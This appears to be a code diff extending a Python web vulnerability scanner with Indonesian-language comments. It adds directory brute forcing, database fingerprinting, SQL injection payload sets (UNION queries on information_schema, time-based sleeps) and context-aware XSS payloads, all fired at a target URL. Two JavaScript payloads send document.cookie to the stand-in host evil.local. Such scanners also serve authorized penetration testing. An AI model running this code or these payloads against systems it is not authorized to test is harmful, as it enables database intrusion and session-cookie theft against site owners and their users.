@@ -8,7 +8,23 @@ import concurrent.futures
 from typing import List, Dict, Tuple, Optional, Any, Set
 
 class WebScanner:
-    """Mesin pemindai keamanan aplikasi web berbasis request asinkron dan fuzzer."""
+    """
+    WebScanner itu kayak detektif pribadi buat website. 
+    Dia bakal nyelidiki setiap sudut website target buat nyari celah keamanan.
+    
+    Bayangin lu punya kunci万能 (master key) yang bisa:
+    - Ngecek apakah website punya pintu belakang yang kebuka (directory brute force)
+    - Nyari form isian yang bisa dimanipulasi (form analysis)
+    - Deteksi apakah ada satpam yang jaga (WAF detection)
+    - Nyoba semua jendela satu-satu buat liat ada yang kebuka gak (fuzzing)
+    
+    Tool ini kerja dengan cara ngirim ribuan request ke website, 
+    terus dicatat response-nya. Dari situ kita bisa tau:
+    - Folder apa aja yang ada (admin, backup, config, dll)
+    - File sensitif yang mungkin kebocoran (.env, .git, database)
+    - Celah inject di form login/search
+    - Teknologi apa yang dipake website itu
+    """
     def __init__(self):
         self.session = requests.Session()
         self.headers = {'User-Agent': 'ApexOmega/5.0 (Standard Web Scanner)'}
@@ -46,33 +62,39 @@ class WebScanner:
 
     def bruteDir(self, baseUrl: str, customList: Optional[List[str]] = None) -> List[Tuple[str, int]]:
         """Pencarian paksa direktori umum/tersembunyi.
-        
+        HANYA melaporkan path yang benar-benar ada (HTTP 200/301/302), bukan yang diblokir (403).
+
         Args:
             baseUrl: URL induk.
             customList: Tambahan wordlist kustom opsional.
-            
+
         Returns:
-            Daftar tuple rute direktori dan respon kodenya.
+            Daftar tuple rute direktori dan respon kodenya (hanya yang valid).
         """
         # Extended common directories (30+)
         commonDirs = [
-            "admin", "login", "config", "api", "v1", "v2", "backup", ".env", "phpinfo.php", 
-            ".git", "wp-admin", "administrator", "dev", "test", "private", "shell.php", 
-            "cmd.php", "src", "public", "assets", "images", "css", "js", "includes", 
+            "admin", "login", "config", "api", "v1", "v2", "backup", ".env", "phpinfo.php",
+            ".git", "wp-admin", "administrator", "dev", "test", "private", "shell.php",
+            "cmd.php", "src", "public", "assets", "images", "css", "js", "includes",
             "lib", "vendor", "docs", "logs", "tmp", "db", "sql", "setup", "install"
         ]
-        if customList: 
+        if customList:
             commonDirs.extend(customList)
-            
+
         found: List[Tuple[str, int]] = []
         for d in commonDirs:
-            if self.core and getattr(self.core, 'stop_requested', False): 
+            if self.core and getattr(self.core, 'stop_requested', False):
                 break
             target = urljoin(baseUrl, d)
             try:
                 response = self.session.head(target, headers=self.headers, timeout=3, allow_redirects=False)
-                if response.status_code in [200, 301, 302, 403]:
+                # HANYA laporkan yang benar-benar accessible (200) atau redirect (301/302)
+                # JANGAN laporkan 403/404 sebagai "found" karena itu artinya file tidak ada/blocked
+                if response.status_code in [200, 301, 302]:
                     found.append((d, response.status_code))
+                # Optional: Log 403 separately for information (but don't report as found)
+                elif response.status_code == 403:
+                    pass  # Silently ignore - this is normal for many paths
             except Exception:
                 pass
         return found
@@ -197,58 +219,249 @@ class WebScanner:
         except Exception:
             return tech_stack
 
-    def runSqlInjectionScan(self, url: str) -> List[Tuple[str, str]]:
-        """Lakukan parameterisasi injeksi kueri paksa untuk deteksi lubang logika DB.
+    def detectDatabaseType(self, url: str) -> str:
+        """Deteksi tipe database dari error messages yang muncul.
         
+        Args:
+            url: Target URL untuk testing.
+            
+        Returns:
+            Tipe database terdeteksi (mysql/postgresql/mssql/oracle/sqlite/generic).
+        """
+        payloads = {
+            "mysql": ["' AND 1=CONVERT(int, @@version)--", "' AND SLEEP(2)--"],
+            "postgresql": ["'; SELECT pg_sleep(2)--", "' AND 1=CAST(version() AS int)--"],
+            "mssql": ["' WAITFOR DELAY '0:0:2'--", "' AND 1=CONVERT(int, @@version)--"],
+            "oracle": ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('test',2)--"],
+            "sqlite": ["' AND 1=LIKE('test',version())--"]
+        }
+        
+        db_scores = {"mysql": 0, "postgresql": 0, "mssql": 0, "oracle": 0, "sqlite": 0}
+        
+        error_patterns = {
+            "mysql": ["mysql", "mariadb", "sql syntax", "near your sql"],
+            "postgresql": ["postgresql", "postgres", "psql"],
+            "mssql": ["sql server", "microsoft", "ado.net"],
+            "oracle": ["oracle", "ora-"],
+            "sqlite": ["sqlite", "sqlite3"]
+        }
+        
+        for db_type, test_payloads in payloads.items():
+            for payload in test_payloads:
+                try:
+                    test_url = f"{url}?id={payload}"
+                    response = self.session.get(test_url, timeout=5)
+                    response_text = response.text.lower()
+                    
+                    for pattern in error_patterns.get(db_type, []):
+                        if pattern in response_text:
+                            db_scores[db_type] += 2
+                except:
+                    pass
+        
+        max_score = max(db_scores.values())
+        if max_score > 0:
+            return max(db_scores.keys(), key=lambda k: db_scores[k])
+        return "generic"
+
+    def runSqlInjectionScan(self, url: str) -> List[Tuple[str, str, str]]:
+        """Lakukan parameterisasi injeksi kueri paksa untuk deteksi lubang logika DB.
+        Dilengkapi dengan deteksi tipe database dan payload yang disesuaikan.
+
         Args:
             url: Tautan target rentan kueri (?,&).
-            
+
         Returns:
-            Daftar rujukan muatan berhasil ter-trigger.
+            Daftar rujukan (payload, tipe, database) yang berhasil ter-trigger.
         """
-        payloads = self.getPayloadList("sqli") + ["' OR SLEEP(5)--", "' AND 1=1--", "admin'--"]
+        # Database-specific payloads untuk targeted injection
+        db_payloads = {
+            "mysql": [
+                "' OR '1'='1", "' UNION SELECT NULL,NULL,NULL--", "' AND SLEEP(5)--",
+                "' OR 1=1 LIMIT 1--", "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+            ],
+            "postgresql": [
+                "' OR '1'='1", "' UNION SELECT NULL,NULL,NULL--", "'; SELECT pg_sleep(5)--",
+                "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+            ],
+            "mssql": [
+                "' OR '1'='1", "' UNION SELECT NULL,NULL,NULL--", "' WAITFOR DELAY '0:0:5'--",
+                "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+            ],
+            "oracle": [
+                "' OR '1'='1", "' UNION SELECT NULL,NULL,NULL FROM dual--",
+                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('test',5)--"
+            ],
+            "sqlite": [
+                "' OR '1'='1", "' UNION SELECT NULL,NULL,NULL--",
+                "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--"
+            ],
+            "generic": [
+                "' OR 1=1--", "\" OR 1=1--", "admin' --", "' UNION SELECT 1,2,3--",
+                "' OR '1'='1' --", "1' AND '1'='1"
+            ]
+        }
+        
+        # Step 1: Deteksi database type
+        print("[*] Mendeteksi tipe database...")
+        detected_db = self.detectDatabaseType(url)
+        
+        if detected_db != "generic":
+            print(f"[+] Database terdeteksi: {detected_db.upper()}")
+        else:
+            print("[*] Menggunakan payload generic (tipe database tidak jelas)")
+        
+        # Step 2: Gunakan payload yang disesuaikan
+        targeted_payloads = db_payloads.get(detected_db, db_payloads["generic"])
+        print(f"[*] Menguji dengan {len(targeted_payloads)} payload untuk {detected_db.upper()}...")
+        
         found = []
-        def check(p: str) -> Optional[Tuple[str, str]]:
+        def check(p: str) -> Optional[Tuple[str, str, str]]:
             try:
                 testUrl = f"{url}?id={p}"
+                start_time = __import__('time').time()
                 res = self.session.get(testUrl, timeout=7)
-                if "sql syntax" in res.text.lower() or "mysql" in res.text.lower() or "postgresql" in res.text.lower() or "sqlite" in res.text.lower():
-                    return (p, "Error-based")
+                elapsed = __import__('time').time() - start_time
+                response_text = res.text.lower()
+                
+                # Error-based detection dengan database-specific messages
+                error_indicators = [
+                    ("mysql", ["mysql", "mariadb", "sql syntax"]),
+                    ("postgresql", ["postgresql", "postgres"]),
+                    ("mssql", ["sql server", "microsoft"]),
+                    ("oracle", ["oracle", "ora-"]),
+                    ("sqlite", ["sqlite", "sqlite3"]),
+                    ("generic", ["sql syntax", "unclosed quotation"])
+                ]
+                
+                for db_type, indicators in error_indicators:
+                    for indicator in indicators:
+                        if indicator in response_text:
+                            if db_type in [detected_db, "generic"]:
+                                return (p, "Error-based", db_type)
+                
+                # Time-based detection
+                if ("sleep" in p.lower() or "waitfor" in p.lower() or "pg_sleep" in p.lower()):
+                    if elapsed > 4:
+                        return (p, "Time-based", detected_db)
+                
                 return None
             except Exception:
                 return None
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-            results = executor.map(check, payloads)
+            results = executor.map(check, targeted_payloads)
             found = [r for r in results if r]
-        return found
-
-    def runXssInjectionScan(self, url: str) -> List[Tuple[str, str]]:
-        """Identifikasi pantulan rentan karakter muatan berbahaya untuk pembajak web DOM.
         
+        # Tambahkan fallback dengan generic payloads jika tidak ada yang ditemukan
+        if not found and detected_db != "generic":
+            print("[*] Fallback: Menguji dengan payload generic...")
+            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+                results = executor.map(check, db_payloads["generic"])
+                found.extend([r for r in results if r])
+        
+        return found
+
+    def runXssInjectionScan(self, url: str) -> List[Tuple[str, str, str]]:
+        """Identifikasi pantulan rentan karakter muatan berbahaya untuk pembajak web DOM.
+        Dilengkapi dengan context-aware payloads berdasarkan tipe refleksi.
+
         Args:
-            url: Target URL pengujian XSS berserta inidikator argumen kueri kosong (?q=).
-            
+            url: Target URL pengujian XSS beserta indikator argumen kueri kosong (?q=).
+
         Returns:
-            Hasil eksploit muatan memantul valid dari DOM/HTML mentah.
+            Hasil eksploit (payload, tipe, context) memantul valid dari DOM/HTML mentah.
         """
-        payloads = self.getPayloadList("xss") + ["<svg/onload=alert(1)>", "\"><script>alert(1)</script>"]
+        # Context-aware XSS payloads
+        context_payloads = {
+            "html": [  # HTML context
+                "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+                "<svg/onload=alert(1)>", "<body onload=alert(1)>",
+                "<iframe src='javascript:alert(1)'>", "<details open ontoggle=alert(1)>"
+            ],
+            "attribute": [  # Inside HTML attributes
+                '"onmouseover="alert(1)', "'onmouseover='alert(1)",
+                '"onfocus="alert(1)', '"><script>alert(1)</script>',
+                '" autofocus onfocus="alert(1)', '" onclick="alert(1)'
+            ],
+            "javascript": [  # JavaScript context
+                "';alert(1)//", "';confirm(1)//", "';prompt(1)//",
+                "';document.location='http://evil.local/?c='+document.cookie//",
+                "';fetch('http://evil.local/?c='+document.cookie)//"
+            ],
+            "event": [  # Event handlers
+                "onerror=alert(1)", "onload=alert(1)", "onmouseover=alert(1)",
+                "onfocus=alert(1)", "onclick=alert(1)", "ontoggle=alert(1)"
+            ],
+            "dom": [  # DOM-based XSS
+                "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
+                "javascript:document.write('<script>alert(1)</script>')",
+                "javascript:eval(atob('YWxlcnQoMSk='))"
+            ]
+        }
+        
+        # Extended payloads untuk berbagai konteks
+        all_payloads = []
+        for context, payloads in context_payloads.items():
+            for p in payloads:
+                all_payloads.append((p, context))
+        
         found = []
-        def check(p: str) -> Optional[Tuple[str, str]]:
+        def check(p: str, context: str) -> Optional[Tuple[str, str, str]]:
             try:
-                testUrl = f"{url}?q={p}"
-                res = self.session.get(testUrl, timeout=5)
-                # Pastikan karakter diurai murni, bukan encode form &lt;
-                if p in res.text and "&lt;script" not in res.text:
-                    return (p, "Reflected")
+                test_params = ["q", "search", "id", "name", "input", "query"]
+                for param in test_params:
+                    test_url = f"{url}?{param}={p}"
+                    res = self.session.get(test_url, timeout=5)
+                    response_text = res.text
+                    
+                    # Check if payload is reflected
+                    if p in response_text:
+                        # Check encoding/escaping
+                        is_escaped = False
+                        escape_indicators = ["&lt;", "&gt;", "&quot;", "&apos;", "&#x"]
+                        for esc in escape_indicators:
+                            if esc in response_text and p.replace("<", esc).replace(">", esc) in response_text:
+                                is_escaped = True
+                                break
+                        
+                        if not is_escaped:
+                            # Determine confidence based on context
+                            confidence = "high" if context in ["html", "javascript"] else "medium"
+                            return (p, "Reflected", f"{context}:{confidence}")
+                        
+                        # Check for partial execution (event handlers still work even if escaped)
+                        event_patterns = ["onerror=", "onload=", "onmouseover=", "onfocus="]
+                        for pattern in event_patterns:
+                            if pattern in response_text.lower() and "alert(1)" in response_text:
+                                return (p, "Partial-Reflected", f"{context}:medium")
+                    
+                    # Check for DOM-based XSS indicators
+                    if "javascript:" in p or "data:" in p:
+                        if p in response_text or p.replace(" ", "") in response_text.replace(" ", ""):
+                            return (p, "DOM-based", f"{context}:high")
+                
                 return None
             except Exception:
                 return None
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-            results = executor.map(check, payloads)
+        # Test dengan berbagai parameter dan konteks
+        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+            futures = []
+            for payload, context in all_payloads[:30]:  # Limit to 30 payloads for performance
+                futures.append(executor.submit(check, payload, context))
+            
+            results = [f.result() for f in concurrent.futures.as_completed(futures) if f.result()]
             found = [r for r in results if r]
-        return found
+        
+        # Remove duplicates and prioritize high confidence
+        unique_found = {}
+        for payload, xss_type, context_info in found:
+            key = f"{payload}:{xss_type}"
+            if key not in unique_found or "high" in context_info:
+                unique_found[key] = (payload, xss_type, context_info)
+        
+        return list(unique_found.values())
 
     def findAdminPanel(self, baseUrl: str) -> List[str]:
         """Tebak panel admin berdasarkan jalur kebiasaan.
@@ -480,25 +693,52 @@ class WebScanner:
 
     def getPayloadList(self, vulnType: str = "xss") -> List[str]:
         """Permintaan spesifikasi payload mentah tersimpan di kamus sistem.
-        
+        Sekarang dengan payload yang diperluas berdasarkan tipe database/context.
+
         Args:
             vulnType: Variasi payload incaran (xss/sqli).
-            
+
         Returns:
             List koleksi payload mentah (string array).
         """
         payloads = {
             "xss": [
+                # HTML Context
                 "<script>alert(1)</script>",
-                "'\"><script>alert(1)</script>",
                 "<img src=x onerror=alert(1)>",
-                "javascript:alert(1)"
+                "<svg/onload=alert(1)>",
+                "<body onload=alert(1)>",
+                "<details open ontoggle=alert(1)>",
+                # Attribute Context
+                "'\"><script>alert(1)</script>",
+                '"onmouseover="alert(1)',
+                '"onfocus="alert(1)',
+                # JavaScript Context
+                "';alert(1)//",
+                "';confirm(1)//",
+                # DOM-based
+                "javascript:alert(1)",
+                "data:text/html,<script>alert(1)</script>"
             ],
             "sqli": [
+                # Generic
                 "' OR 1=1--",
                 "\" OR 1=1--",
                 "admin' --",
-                "' UNION SELECT 1,2,3--"
+                "' UNION SELECT 1,2,3--",
+                "' OR '1'='1' --",
+                # MySQL
+                "' AND SLEEP(5)--",
+                "' UNION SELECT NULL,NULL,NULL--",
+                "' OR 1=1 LIMIT 1--",
+                # PostgreSQL
+                "'; SELECT pg_sleep(5)--",
+                # MSSQL
+                "' WAITFOR DELAY '0:0:5'--",
+                # Oracle
+                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('test',5)--",
+                # SQLite
+                "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--"
             ]
         }
         return payloads.get(vulnType.lower(), [])
